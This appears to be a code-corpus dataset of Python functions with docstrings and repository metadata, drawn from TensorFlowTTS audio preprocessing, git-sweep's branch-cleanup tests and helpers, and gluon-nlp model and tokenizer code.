{"docstring": "# we do not need #4, use sil to replace it\n", "func_signal": "def get_phoneme_from_char_and_pinyin(self, chn_char, pinyin):\n", "code": "chn_char = chn_char.replace(\"#4\", \"\")\nchar_len = len(chn_char)\ni, j = 0, 0\nresult = [\"sil\"]\nwhile i < char_len:\n    cur_char = chn_char[i]\n    if is_zh(cur_char):\n        if pinyin[j][:-1] not in self.pinyin_dict:\n            assert chn_char[i + 1] == \"\u513f\"\n            assert pinyin[j][-2] == \"r\"\n            tone = pinyin[j][-1]\n            a = pinyin[j][:-2]\n            a1, a2 = self.pinyin_dict[a]\n            result += [a1, a2 + tone, \"er5\"]\n            if i + 2 < char_len and chn_char[i + 2] != \"#\":\n                result.append(\"#0\")\n\n            i += 2\n            j += 1\n        else:\n            tone = pinyin[j][-1]\n            a = pinyin[j][:-1]\n            a1, a2 = self.pinyin_dict[a]\n            result += [a1, a2 + tone]\n\n            if i + 1 < char_len and chn_char[i + 1] != \"#\":\n                result.append(\"#0\")\n\n            i += 1\n            j += 1\n    elif cur_char == \"#\":\n        result.append(chn_char[i : i + 2])\n        i += 2\n    else:\n        # ignore the unknown char and punctuation\n        # result.append(chn_char[i])\n        i += 1\nif result[-1] == \"#0\":\n    result = result[:-1]\nresult.append(\"sil\")\nassert j == len(pinyin)\nreturn result", "path": "TensorFlowTTS/tensorflow_tts/processor/baker.py", "commit_date": "2020-08-19 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Normalize mel spectrogram with pre-computed statistics.\"\"\"\n", "func_signal": "def normalize():\n", "code": "config = parse_and_config()\nif config[\"format\"] == \"npy\":\n    # init scaler with saved values\n    scaler = StandardScaler()\n    scaler.mean_, scaler.scale_ = np.load(\n        os.path.join(config[\"outdir\"], \"stats.npy\")\n    )\n    scaler.n_features_in_ = config[\"num_mels\"]\nelse:\n    raise ValueError(\"'npy' is the only supported format.\")\n\n# find all \"raw-feats\" files in both train and valid folders\nglob_path = os.path.join(config[\"rootdir\"], \"**\", \"raw-feats\", \"*.npy\")\nmel_raw_feats = glob.glob(glob_path, recursive=True)\nlogging.info(f\"Files to normalize: {len(mel_raw_feats)}\")\n\n# check for output directories\nos.makedirs(os.path.join(config[\"outdir\"], \"train\", \"norm-feats\"), exist_ok=True)\nos.makedirs(os.path.join(config[\"outdir\"], \"valid\", \"norm-feats\"), exist_ok=True)\n\np = Pool(config[\"n_cpus\"])\npartial_fn = partial(gen_normal_mel, scaler=scaler, config=config)\nlist(p.map(partial_fn, tqdm(mel_raw_feats, desc=\"[Normalizing]\")))", "path": "TensorFlowTTS/tensorflow_tts/bin/preprocess.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Generate WAV file and save it.\nArgs:\n    gl_tf (tf.Tensor): reconstructed signal from GL algorithm.\n    output_dir (str): output directory where audio file will be saved.\n    wav_name (str): name of the output file.\n\"\"\"\n", "func_signal": "def save_wav(self, gl_tf, output_dir, wav_name):\n", "code": "encode_fn = lambda x: tf.audio.encode_wav(x, self.ds_config[\"sampling_rate\"])\ngl_tf = tf.expand_dims(gl_tf, -1)\nif not isinstance(wav_name, list):\n    wav_name = [wav_name]\n\nif len(gl_tf.shape) > 2:\n    bs, *_ = gl_tf.shape\n    assert bs == len(wav_name), \"Batch and 'wav_name' have different size.\"\n    tf_wav = tf.map_fn(encode_fn, gl_tf, dtype=tf.string)\n    for idx in tf.range(bs):\n        output_path = os.path.join(output_dir, f\"{wav_name[idx]}.wav\")\n        tf.io.write_file(output_path, tf_wav[idx])\nelse:\n    tf_wav = encode_fn(gl_tf)\n    tf.io.write_file(os.path.join(output_dir, f\"{wav_name[0]}.wav\"), tf_wav)", "path": "TensorFlowTTS/tensorflow_tts/utils/griffin_lim.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Save computed statistics to disk.\nArgs:\n    scaler_list (List): List of scalers containing statistics to save.\n    config (Dict): configuration dictionary.\n\"\"\"\n", "func_signal": "def save_statistics_to_file(scaler_list, config):\n", "code": "for scaler, name in scaler_list:\n    stats = np.stack((scaler.mean_, scaler.scale_))\n    np.save(\n        os.path.join(config[\"outdir\"], f\"stats{name}.npy\"),\n        stats.astype(np.float32),\n        allow_pickle=False,\n    )", "path": "TensorFlowTTS/tensorflow_tts/bin/preprocess.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Normalize the mel spectrogram and save it to the corresponding path.\nArgs:\n    mel_path (string): path of the mel spectrogram to normalize.\n    scaler (sklearn.base.BaseEstimator): scaling function to use for normalize.\n    config (Dict): configuration dictionary.\n\"\"\"\n", "func_signal": "def gen_normal_mel(mel_path, scaler, config):\n", "code": "mel = np.load(mel_path)\nmel_norm = scaler.transform(mel)\npath, file_name = os.path.split(mel_path)\n*_, subdir, suffix = path.split(os.sep)\n\nutt_id = file_name.split(f\"-{suffix}.npy\")[0]\nnp.save(\n    os.path.join(\n        config[\"outdir\"], subdir, \"norm-feats\", f\"{utt_id}-norm-feats.npy\"\n    ),\n    mel_norm.astype(np.float32),\n    allow_pickle=False,\n)", "path": "TensorFlowTTS/tensorflow_tts/bin/preprocess.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"\nThe recommended cleanup command contains the same arguments given.\n\"\"\"\n", "func_signal": "def test_will_preserve_arguments(self):\n", "code": "for i in range(1, 6):\n    self.command('git checkout -b branch{0}'.format(i))\n    self.make_commit()\n    self.command('git checkout master')\n    self.make_commit()\n    self.command('git merge branch{0}'.format(i))\n\npreview = 'git-sweep preview --master=master --origin=origin'\ncleanup = 'git-sweep cleanup --master=master --origin=origin'\n\n(retcode, stdout, stderr) = self.gscommand(preview)\n\nself.assertResults('''\n    Fetching from the remote\n    These branches have been merged into master:\n\n      branch1\n      branch2\n      branch3\n      branch4\n      branch5\n\n    To delete them, run again with `{0}`\n    '''.format(cleanup), stdout)", "path": "git-sweep/src/gitsweep/tests/test_cli.py", "commit_date": "2012-03-26 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nReturns a list of remote refs, skipping ones you don't need.\n\nIf ``skip`` is empty, it will default to ``['HEAD',\nself.master_branch]``.\n\"\"\"\n", "func_signal": "def _filtered_remotes(self, origin, skip=[]):\n", "code": "if not skip:\n    skip = ['HEAD', self.master_branch]\n\nrefs = [i for i in origin.refs if not i.remote_head in skip]\n\nreturn refs", "path": "git-sweep/src/gitsweep/base.py", "commit_date": "2012-03-21 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nReturn and optionally create a CommandLine object.\n\"\"\"\n", "func_signal": "def cli(self):\n", "code": "if not self._commandline:\n    self._commandline = CommandLine([])\n\nreturn self._commandline", "path": "git-sweep/src/gitsweep/tests/testcases.py", "commit_date": "2012-03-21 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nWill fetch if told not to.\n\"\"\"\n", "func_signal": "def test_fetch(self):\n", "code": "(retcode, stdout, stderr) = self.gscommand('git-sweep preview')\n\nself.assertResults('''\n    Fetching from the remote\n    No remote branches are available for cleaning up\n    ''', stdout)", "path": "git-sweep/src/gitsweep/tests/test_cli.py", "commit_date": "2012-03-26 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nWill preview the proposed deletes.\n\"\"\"\n", "func_signal": "def test_will_cleanup(self):\n", "code": "for i in range(1, 6):\n    self.command('git checkout -b branch{0}'.format(i))\n    self.make_commit()\n    self.command('git checkout master')\n    self.make_commit()\n    self.command('git merge branch{0}'.format(i))\n\nwith patch('gitsweep.cli.raw_input', create=True) as ri:\n    ri.return_value = 'y'\n    (retcode, stdout, stderr) = self.gscommand('git-sweep cleanup')\n\nself.assertResults('''\n    Fetching from the remote\n    These branches have been merged into master:\n\n      branch1\n      branch2\n      branch3\n      branch4\n      branch5\n\n    Delete these branches? (y/n) \n      deleting branch1 (done)\n      deleting branch2 (done)\n      deleting branch3 (done)\n      deleting branch4 (done)\n      deleting branch5 (done)\n\n    All done!\n\n    Tell everyone to run `git fetch --prune` to sync with this remote.\n    (you don't have to, yours is synced)\n    ''', stdout)", "path": "git-sweep/src/gitsweep/tests/test_cli.py", "commit_date": "2012-03-26 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nRuns the command with the given args.\n\"\"\"\n", "func_signal": "def gscommand(self, command):\n", "code": "args = split(command)\n\nself.cli.args = args[1:]\n\npatches = (\n    patch.object(sys, 'stdout'),\n    patch.object(sys, 'stderr'))\n\nwith nested(*patches):\n    stdout = sys.stdout\n    stderr = sys.stderr\n    try:\n        self.cli.run()\n    except SystemExit as se:\n        pass\n\nstdout = ''.join([i[0][0] for i in stdout.write.call_args_list])\nstderr = ''.join([i[0][0] for i in stderr.write.call_args_list])\n\nreturn (se.code, stdout, stderr)", "path": "git-sweep/src/gitsweep/tests/testcases.py", "commit_date": "2012-03-21 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nGet a list of branch names from merged refs from self.inspector.\n\nBy default, it returns a list of branch names. You can return the\nactual ``git.RemoteRef`` objects by passing ``refobjs=True``.\n\"\"\"\n", "func_signal": "def merged_refs(self, refobjs=False):\n", "code": "refs = self.inspector.merged_refs()\n\nif refobjs:\n    return refs\n\nreturn [i.remote_head for i in refs]", "path": "git-sweep/src/gitsweep/tests/testcases.py", "commit_date": "2012-03-21 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nRemove any created repositories.\n\"\"\"\n", "func_signal": "def tearDown(self):\n", "code": "rmtree(self.repodir)\n\nfor clone in self._clone_dirs:\n    rmtree(clone)", "path": "git-sweep/src/gitsweep/tests/testcases.py", "commit_date": "2012-03-21 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nWill preview the proposed deletes.\n\"\"\"\n", "func_signal": "def test_will_preview_none_found(self):\n", "code": "for i in range(1, 6):\n    self.command('git checkout -b branch{0}'.format(i))\n    self.make_commit()\n    self.command('git checkout master')\n\n(retcode, stdout, stderr) = self.gscommand('git-sweep preview')\n\nself.assertResults('''\n    Fetching from the remote\n    No remote branches are available for cleaning up\n    ''', stdout)", "path": "git-sweep/src/gitsweep/tests/test_cli.py", "commit_date": "2012-03-26 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nSets up the Git repository for testing.\n\nThe following will be available after :py:method`setUp()` runs.\n\nself.repodir\n    The absolute filename of the Git repository\n\nself.repo\n    A ``git.Repo`` object for self.repodir\n\nThis will create the root commit in the test repository automaticall.\n\"\"\"\n", "func_signal": "def setUp(self):\n", "code": "super(GitSweepTestCase, self).setUp()\n\nrepodir = mkdtemp()\n\nself.repodir = repodir\nself.repo = Repo.init(repodir)\n\nrootcommit_filename = join(repodir, 'rootcommit')\n\nwith open(rootcommit_filename, 'w') as fh:\n    fh.write('')\n\nself.repo.index.add([basename(rootcommit_filename)])\nself.repo.index.commit('Root commit')\n\n# Cache the remote per test\nself._remote = None\n\n# Keep track of cloned repositories that track self.repo\nself._clone_dirs = []", "path": "git-sweep/src/gitsweep/tests/testcases.py", "commit_date": "2012-03-21 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nMakes a random commit in the current branch.\n\"\"\"\n", "func_signal": "def make_commit(self):\n", "code": "fragment = uuid().hex[:8]\nfilename = join(self.repodir, fragment)\nwith open(filename, 'w') as fh:\n    fh.write(uuid().hex)\n\nself.repo.index.add([basename(filename)])\nself.repo.index.commit('Adding {0}'.format(basename(filename)))", "path": "git-sweep/src/gitsweep/tests/testcases.py", "commit_date": "2012-03-21 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nClones the test case's repository and tracks it as a remote.\n\nReturns a ``git.Repo`` object.\n\"\"\"\n", "func_signal": "def remote(self):\n", "code": "if not self._remote:\n    clonedir = mkdtemp()\n    self._clone_dirs.append(clonedir)\n\n    self._remote = Repo.clone(self.repo, clonedir)\n\n# Update in case the remote has changed\nself._remote.remotes[0].pull()\nreturn self._remote", "path": "git-sweep/src/gitsweep/tests/testcases.py", "commit_date": "2012-03-21 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nRuns the Git command in self.repo\n\"\"\"\n", "func_signal": "def command(self, command):\n", "code": "args = split(command)\n\ncmd = Git(self.repodir)\n\ncmd.execute(args)", "path": "git-sweep/src/gitsweep/tests/testcases.py", "commit_date": "2012-03-21 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nReturn and optionally create a Deleter from self.remote.\n\"\"\"\n", "func_signal": "def deleter(self):\n", "code": "if not self._deleter:\n    self._deleter = Deleter(self.remote)\n\nreturn self._deleter", "path": "git-sweep/src/gitsweep/tests/testcases.py", "commit_date": "2012-03-21 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nWill not fetch if told not to.\n\"\"\"\n", "func_signal": "def test_no_fetch(self):\n", "code": "(retcode, stdout, stderr) = self.gscommand(\n    'git-sweep preview --nofetch')\n\nself.assertResults('''\n    No remote branches are available for cleaning up\n    ''', stdout)", "path": "git-sweep/src/gitsweep/tests/test_cli.py", "commit_date": "2012-03-26 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nAssert that output matches expected argument.\n\"\"\"\n", "func_signal": "def assertResults(self, expected, actual):\n", "code": "expected = dedent(expected).strip()\n\nactual = actual.strip()\n\nself.assertEqual(expected, actual)", "path": "git-sweep/src/gitsweep/tests/testcases.py", "commit_date": "2012-03-21 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nCan be forced to skip certain branches.\n\"\"\"\n", "func_signal": "def test_will_skip_certain_branches(self):\n", "code": "for i in range(1, 6):\n    self.command('git checkout -b branch{0}'.format(i))\n    self.make_commit()\n    self.command('git checkout master')\n    self.make_commit()\n    self.command('git merge branch{0}'.format(i))\n\n(retcode, stdout, stderr) = self.gscommand(\n    'git-sweep preview --skip=branch1,branch2')\n\ncleanup = 'git-sweep cleanup --skip=branch1,branch2'\n\nself.assertResults('''\n    Fetching from the remote\n    These branches have been merged into master:\n\n      branch3\n      branch4\n      branch5\n\n    To delete them, run again with `{0}`\n    '''.format(cleanup), stdout)", "path": "git-sweep/src/gitsweep/tests/test_cli.py", "commit_date": "2012-03-26 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nWill preview the proposed deletes.\n\"\"\"\n", "func_signal": "def test_will_abort_cleanup(self):\n", "code": "for i in range(1, 6):\n    self.command('git checkout -b branch{0}'.format(i))\n    self.make_commit()\n    self.command('git checkout master')\n    self.make_commit()\n    self.command('git merge branch{0}'.format(i))\n\nwith patch('gitsweep.cli.raw_input', create=True) as ri:\n    ri.return_value = 'n'\n    (retcode, stdout, stderr) = self.gscommand('git-sweep cleanup')\n\nself.assertResults('''\n    Fetching from the remote\n    These branches have been merged into master:\n\n      branch1\n      branch2\n      branch3\n      branch4\n      branch5\n\n    Delete these branches? (y/n) \n    OK, aborting.\n    ''', stdout)", "path": "git-sweep/src/gitsweep/tests/test_cli.py", "commit_date": "2012-03-26 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nGets the remote that references origin by name self.origin_name.\n\"\"\"\n", "func_signal": "def _origin(self):\n", "code": "origin = None\n\nfor remote in self.repo.remotes:\n    if remote.name == self.remote_name:\n        origin = remote\n\nif not origin:\n    raise MissingRemote('Could not find the remote named {0}'.format(\n        self.remote_name))\n\nreturn origin", "path": "git-sweep/src/gitsweep/base.py", "commit_date": "2012-03-21 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nWill preview the proposed deletes.\n\"\"\"\n", "func_signal": "def test_will_preview(self):\n", "code": "for i in range(1, 6):\n    self.command('git checkout -b branch{0}'.format(i))\n    self.make_commit()\n    self.command('git checkout master')\n    self.make_commit()\n    self.command('git merge branch{0}'.format(i))\n\n(retcode, stdout, stderr) = self.gscommand('git-sweep preview')\n\nself.assertResults('''\n    Fetching from the remote\n    These branches have been merged into master:\n\n      branch1\n      branch2\n      branch3\n      branch4\n      branch5\n\n    To delete them, run again with `git-sweep cleanup`\n    ''', stdout)", "path": "git-sweep/src/gitsweep/tests/test_cli.py", "commit_date": "2012-03-26 00:00:00", "repo_name": "arc90/git-sweep", "stars": 2504, "license": "mit", "language": "python", "size": 43}
{"docstring": "\"\"\"\nGenerate the representation given the inputs.\n\nThis is used in training or fine-tuning a mobile bert model.\n\nParameters\n----------\nF\ndata\n    - layout = 'NT'\n        Shape (batch_size, seq_length, C)\n    - layout = 'TN'\n        Shape (seq_length, batch_size, C)\nvalid_length\n    Shape (batch_size,)\n\nReturns\n-------\nout\n    - layout = 'NT'\n        Shape (batch_size, seq_length, C_out)\n    - layout = 'TN'\n        Shape (seq_length, batch_size, C_out)\n\"\"\"\n", "func_signal": "def forward(self, data, valid_length):\n", "code": "if self._layout == 'NT':\n    batch_axis, time_axis = 0, 1\nelif self._layout == 'TN':\n    batch_axis, time_axis = 1, 0\nelse:\n    raise NotImplementedError('Received layout=\"{}\". '\n                              'Only \"NT\" and \"TN\" are supported.'.format(self._layout))\n# 1. Embed the data\nattn_mask = gen_self_attn_mask(data, valid_length,\n                               dtype=self._dtype,\n                               layout=self._layout,\n                               attn_type='full')\nout = data\nall_encodings_outputs = []\nadditional_outputs = []\nall_encodings_outputs.append(out)\nfor layer_idx in range(self._num_layers):\n    layer = self.all_layers[layer_idx]\n    out, attention_weights = layer(out, attn_mask)\n    # out : [batch_size, seq_len, units]\n    # attention_weights : [batch_size, num_heads, seq_len, seq_len]\n    if self._output_all_encodings:\n        out = npx.sequence_mask(out,\n                                  sequence_length=valid_length,\n                                  use_sequence_length=True,\n                                  axis=time_axis)\n        all_encodings_outputs.append(out)\n\n    if self._output_attention:\n        additional_outputs.append(attention_weights)\n\nif not self._output_all_encodings:\n    # if self._output_all_encodings, SequenceMask is already applied above\n    out = npx.sequence_mask(out, sequence_length=valid_length,\n                              use_sequence_length=True,\n                              axis=time_axis)\n    return out, additional_outputs\nelse:\n    return all_encodings_outputs, additional_outputs", "path": "gluon-nlp/src/gluonnlp/models/mobilebert.py", "commit_date": "2020-11-05 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"Generate the representation given the inputs.\n\nThis is used for pre-training or fine-tuning a mobile bert model.\nGet the first token of the whole sequence which is [CLS]\n\nParameters\n----------\nsequence\n    - layout = 'NT'\n        Shape (batch_size, sequence_length, units)\n    - layout = 'TN'\n        Shape (sequence_length, batch_size, units)\n\nReturns\n-------\nret\n    Shape (batch_size, units)\n\"\"\"\n", "func_signal": "def apply_pooling(self, sequence):\n", "code": "if self._layout == 'NT':\n    outputs = sequence[:, 0, :]\nelif self._layout == 'TN':\n    outputs = sequence[0, :, :]\nelse:\n    raise NotImplementedError\nif self.classifier_activation:\n    return self.pooler(outputs)\nelse:\n    return outputs", "path": "gluon-nlp/src/gluonnlp/models/roberta.py", "commit_date": "2020-11-05 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"\n\nParameters\n----------\nF\ndata\n    - layout = 'NT'\n        Shape (batch_size, seq_length, C_in)\n    - layout = 'TN'\n        Shape (seq_length, batch_size, C_in)\nattn_mask\n    The attention mask\n    Shape (batch_size, seq_length, seq_length)\n\nReturns\n-------\nout\n    - layout = 'NT'\n        Shape (batch_size, seq_length, C_out)\n    - layout = 'TN'\n        Shape (seq_length, batch_size, C_out)\nattn_weight\n    Shape (batch_size, seq_length, seq_length)\n\"\"\"\n", "func_signal": "def forward(self, data, attn_mask):\n", "code": "if self._use_bottleneck:\n    bn_proj = self.in_bottleneck_proj(data)\n    bn_proj = self.in_bottleneck_ln(bn_proj)\n    input = bn_proj\n    if self._bottleneck_strategy == 'qk_sharing':\n        # for Mobile Bert\n        qk_shared = self.shared_qk(data)\n        qk_shared = self.shared_qk_ln(qk_shared)\n        query = qk_shared\n        key = qk_shared\n        value = data\n    elif self._bottleneck_strategy == 'from_bottleneck':\n        # for Mobile Bert Tiny\n        query = bn_proj\n        key = bn_proj\n        value = bn_proj\n    elif self._bottleneck_strategy == 'from_input':\n        query = data\n        key = data\n        value = data\n    else:\n        raise NotImplementedError\nelse:\n    input = data\n    query = data\n    key = data\n    value = data\n\nquery = npx.reshape(self.attn_query(query), (-2, -2, self._num_heads, -1))\nkey = npx.reshape(self.attn_key(key), (-2, -2, self._num_heads, -1))\nvalue = npx.reshape(self.attn_value(value), (-2, -2, self._num_heads, -1))\nout, [_, attn_weight] = self.attention_cell(query, key, value, attn_mask)\nout = self.attention_proj(out)\nif not self._use_bottleneck:\n    out = self.dropout_layer(out)\nout = out + input\nout = self.layer_norm(out)\nfor ffn_idx in range(self._num_stacked_ffn):\n    ffn = self.stacked_ffn[ffn_idx]\n    out = ffn(out)\n\nif self._use_bottleneck:\n    out = self.out_bottleneck_proj(out)\n    out = self.dropout_layer(out)\n    out = out + data\n    out = self.out_bottleneck_ln(out)\nreturn out, attn_weight", "path": "gluon-nlp/src/gluonnlp/models/mobilebert.py", "commit_date": "2020-11-05 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "# Here we just test that the scripts are runnable. Should be revised to test for correctness\n", "func_signal": "def test_get_activation():\n", "code": "for act_type in ['leaky', 'identity', 'elu', 'gelu', 'gelu(tanh)', 'gelu(sigmoid)',\n                 'relu', 'sigmoid', 'tanh', 'softrelu', 'softsign']:\n    act = get_activation(act_type)\n    act.hybridize()\n    _ = act(mx.np.random.normal(0, 1, (10, 10)))", "path": "gluon-nlp/tests/test_layers.py", "commit_date": "2020-10-29 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "# test from pretrained\n", "func_signal": "def test_xlmr(model_name, ctx):\n", "code": "assert len(list_pretrained_xlmr()) > 0\nwith ctx:\n    with tempfile.TemporaryDirectory() as root:\n        cfg, tokenizer, params_path, mlm_params_path =\\\n            get_pretrained_xlmr(model_name, load_backbone=True, load_mlm=False, root=root)\n        assert cfg.MODEL.vocab_size == len(tokenizer.vocab)\n        # test backbone\n        xlmr_model = XLMRModel.from_cfg(cfg)\n        xlmr_model.load_parameters(params_path)\n        # pass the mlm model\n\n    # test forward\n    batch_size = 1\n    seq_length = 4\n    vocab_size = len(tokenizer.vocab)\n    input_ids = mx.np.array(\n        np.random.randint(\n            2,\n            vocab_size,\n            (batch_size, seq_length)\n        ),\n        dtype=np.int32\n    )\n    valid_length = mx.np.array(\n        np.random.randint(\n            seq_length // 2,\n            seq_length,\n            (batch_size,)\n        ),\n        dtype=np.int32\n    )\n    contextual_embeddings, pooled_out = xlmr_model(input_ids, valid_length)\n    mx.npx.waitall()\n    # test backward\n    label_smooth_loss = LabelSmoothCrossEntropyLoss(num_labels=vocab_size)\n    with mx.autograd.record():\n        contextual_embeddings, pooled_out = xlmr_model(input_ids, valid_length)\n        loss = label_smooth_loss(contextual_embeddings, input_ids)\n        loss.backward()\n    mx.npx.waitall()", "path": "gluon-nlp/tests/test_models_xlmr.py", "commit_date": "2020-11-06 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"Test for huggingface tokenizer >=0.8\"\"\"\n", "func_signal": "def test_huggingface_wordpiece_tokenizer_v08():\n", "code": "with tempfile.TemporaryDirectory() as dir_path:\n    model_path = os.path.join(dir_path, 'hf_wordpiece_new_0.8.model')\n    download(url=get_repo_url() +\n                 'tokenizer_test_models/hf_wordpiece_new_0.8/hf_wordpiece.model',\n             path=model_path,\n             sha1_hash='66ccadf6e5e354ff9604e4a82f107a2ac873abd5')\n    vocab_path = os.path.join(dir_path, 'hf_wordpiece_new_0.8.vocab')\n    download(url=get_repo_url() +\n                 'tokenizer_test_models/hf_wordpiece_new_0.8/hf_wordpiece.vocab',\n             path=vocab_path,\n             sha1_hash='dd6fdf4bbc74eaa8806d12cb3d38a4d9a306aea8')\n    tokenizer = HuggingFaceTokenizer(model_path, vocab_path)\n    gt_tokenized = [['Hel', '##lo', ',', 'y', '[UNK]', 'all', '!',\n                     'How', 'are', 'you', '[UNK]', '[UNK]', '[UNK]', '[UNK]', '?'],\n                    ['Gl', '##u', '##on', '##N', '##L', '##P', 'is', 'great', '[UNK]',\n                     '[UNK]', '[UNK]', '!', '!', '!'],\n                    ['Gl', '##u', '##on', '##N', '##L', '##P', '-',\n                     'Am', '##az', '##on', '-', 'Ha', '##ibi', '##n', '-', 'Leon', '##ard',\n                     '-', 'She', '##n', '##g', '-', 'Sh', '##ua', '##i', '-', 'X',\n                     '##ing', '##j', '##ian', '.', '.', '.', '.', '.', '/', ':', '!',\n                     '@', '#', '[UNK]', 'ab', '##c', '[UNK]']]\n    gt_offsets = [[(0, 3), (3, 5), (5, 6), (7, 8), (8, 9), (9, 12), (12, 13),\n                   (14, 17), (18, 21), (22, 25), (26, 27), (28, 29), (30, 31),\n                   (32, 33), (34, 35)],\n                  [(0, 2), (2, 3), (3, 5), (5, 6), (6, 7), (7, 8), (9, 11), (12, 17),\n                   (17, 18), (18, 19), (19, 20), (20, 21), (21, 22), (22, 23)],\n                  [(0, 2), (2, 3), (3, 5), (5, 6), (6, 7), (7, 8), (8, 9),\n                   (9, 11), (11, 13), (13, 15), (15, 16), (16, 18), (18, 21),\n                   (21, 22), (22, 23), (23, 27), (27, 30), (30, 31), (31, 34),\n                   (34, 35), (35, 36), (36, 37), (37, 39), (39, 41), (41, 42),\n                   (42, 43), (43, 44), (44, 47), (47, 48), (48, 51), (51, 52),\n                   (52, 53), (53, 54), (54, 55), (55, 56), (56, 57), (57, 58),\n                   (58, 59), (59, 60), (60, 61), (62, 63), (63, 65), (65, 66),\n                   (66, 67)]]\n    gt_decode = ['Hello, y all! How are you?',\n                 'GluonNLP is great!!!',\n                 'GluonNLP - Amazon - Haibin - Leonard - Sheng - Shuai - Xingjian..... / '\n                 ':! @ # abc']\n    verify_encode_token(tokenizer, SUBWORD_TEST_SAMPLES, gt_tokenized)\n    verify_pickleble(tokenizer, HuggingFaceTokenizer)\n    verify_encode_token_with_offsets(tokenizer, SUBWORD_TEST_SAMPLES, gt_offsets)\n    verify_decode_hf(tokenizer, SUBWORD_TEST_SAMPLES, gt_decode)", "path": "gluon-nlp/tests/test_data_tokenizers.py", "commit_date": "2020-10-29 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"Whether the sub-token is the first sub-token in a token list.\n\nOnly supports the case when the tokenizer is a HuggingFaceWordPieceTokenizer\n\nParameters\n----------\ntokens\n    A single token or a list of tokens\n\nReturns\n-------\nret\n    The results\n\"\"\"\n", "func_signal": "def is_first_subword(self, tokens):\n", "code": "assert self.model_type == 'WordPiece', \\\n    'Only supports WordPiece model. The model_type={}'.format(self.model_type)\nif isinstance(tokens, str):\n    return not tokens.startswith('##')\nelif isinstance(tokens, int):\n    return tokens in self._first_subtoken_id_set\nelif isinstance(tokens, list):\n    if len(tokens) == 0:\n        return []\n    if isinstance(tokens[0], str):\n        return [not ele.startswith('##') for ele in tokens]\n    elif isinstance(tokens[0], int):\n        return [ele in self._first_subtoken_id_set for ele in tokens]\n    else:\n        raise NotImplementedError\nelse:\n    raise NotImplementedError", "path": "gluon-nlp/src/gluonnlp/data/tokenizers/huggingface.py", "commit_date": "2020-12-01 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
